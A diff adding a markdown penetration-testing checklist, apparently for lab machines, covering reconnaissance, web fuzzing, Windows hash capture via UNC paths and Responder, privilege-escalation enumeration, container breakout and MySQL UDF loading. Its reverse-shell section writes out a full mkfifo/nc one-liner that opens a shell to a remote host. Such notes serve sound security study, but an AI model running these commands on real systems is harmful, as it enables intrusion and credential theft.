@@ -1,0 +1,148 @@
+# Methodology
+
+- [Passive Reconnaissance](#passive-reconnaissance)
+- [Active Reconnaissance](#active-reconnaissance)
+
+## Passive Reconnaisance
+
+## Active Reconnaisance
+
+### TCP Services
+#### SSH 
+- [ ] Check Version 
+	- [ ] 7.7 or less user enumeration
+		- [ ] https://github.com/sergiky/CVE-2018-15473-Exploit-docker
+
+#### DNS
+
+- [ ] Check NS
+- [ ] Check A
+- [ ] Check any
+- [ ] Check axfr
+#### Web
+
+##### Hidden files
+
+- [ ] robots.txt
+- [ ] sitemap.xml
+- [ ] .env
+- [ ] .git
+
+##### Check console and source code
+
+- [ ] Check console from browser
+- [ ] Check source code of all the pages
+
+##### Fuzzing
+- [ ] Fuzzing directories
+- [ ] Fuzzing directories with a slash at the final: http://example.htb/FUZZ
+- [ ] Fuzzing files with extension: .bak,.txt,.html,.php...
+- [ ] Fuzzing subdomains
+- [ ] Fuzzing API. Use endpoints wordlists for api (in seclist for example)
+
+Use appropiate wordlists:
+normal fuzzing:
+- /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2-3-medium...
+
+subdomains:
+- /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top-1-million-111...
+#### Check technologies and vulnerabilities
+
+- [ ] Discover the technology usage and search for important CVE
+
+##### UNC For Windows
+
+- [ ] if you detect a place when you can do a LFI/ File disclousure / IP field you can use UNC `\\<your-ip>\file` or `//<your-ip>/file`. And use responder to obtain the NTLM hash cleartext password.
+
+##### APIs
+- [ ] Fuzzing APIs to discover hidden endpoints.
+
+#### RPC
+
+- [ ] Is anonymous access allowed?
+- [ ] Can you access with valid credential?
+- [ ] Can you obtain the password policy?
+- [ ] Can you obtain the usernames?
+- [ ] Can you obtain the description of the usernames?
+- [ ] You need to do password spraying?
+### UDP Services
+
+
+# Reverse shell
+- [ ] Try to bash -c 'bash -i'
+- [ ] Try with bash -i
+- [ ] try with the old version of nc
+	- [ ] rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+
+
+# Privilege escalation
+
+# Linux
+
+- [ ] Search sudo privileges
+	- [ ] sudo -l
+- [ ] Search in common paths 
+	- [ ] /etc/nginx/sites-enabled
+	- [ ] /opt
+- [ ] Search process
+	- [ ] ps -ef --forest | less -S
+- [ ] Search internal services running
+	- [ ] netstat -tulnp
+- [ ] Search SUID binaries
+	- [ ] find / -perm -4000 2>/dev/null
+- [ ] Search capabilities
+	- [ ] getcap -r / 2>/dev/null
+- [ ] Are you in a container?
+	- [ ] Docker?
+		- [ ] ls -la /. = .dockerenv?
+		- [ ] You see something of docker in processes?
+	- [ ] LXC?
+
+## Windows
+
+- [ ] Obtain information about the user
+- [ ] Obtain information about the groups, localgroups
+	- [ ] Some way to privilege escalation via some groups?
+- [ ] Research about the security privileged assigned
+	- [ ] SeImpersonatePrivilege
+	- [ ] Server Operators
+	- [ ] SeDebugPrivilege (Printer operator)
+- [ ] Check logon requirements. Useful for bruteforce
+- [ ] Check if autologon is enable for some user
+- [ ] Password reuse
+- [ ] Search exposed credentials in configuration files, log files and user history files
+	- [ ] Get-History
+	- [ ] Environment variables
+		- [ ] gci env:* | sort-object name
+	- [ ] See files or directories with different permissions
+		- [ ] icalcs *
+- [ ] There is some internal por running?
+	- [ ] What is the service?
+- [ ] Do you see something interesting in processes?
+	- [ ] You can use some powershell code to see process tree.
+- [ ] Vulnerables software, for exmaple in C:\Program Files
+- [ ] Unquoted Service path
+- [ ] Use enumeartion scripts
+- [ ] Resource-Based Constrained Delegation attack RBCD
+- [ ] 
+
+## Container Escape or Docker Breakout
+
+- [ ] can you see some interesting environment variable?
+	- [ ] env
+- [ ] SSH is enable in the principal host?
+- [ ] Can you find docker.sock?
+	- [ ] find -name docker.sock 2>/dev/null
+- [ ] Is docker command active?
+
+## LXC breakout or LXC escape
+
+
+## Active Directory
+- [ ] What port have open?
+- [ ] What is the hostname? (you can obtain via netexec and the different protocols)
+
+# SQL
+- [ ] Is the service running with an overprivilege user?
+	- [ ] Try to load a malicious library and execute command
+		- [ ] lib_mysqludf_sys
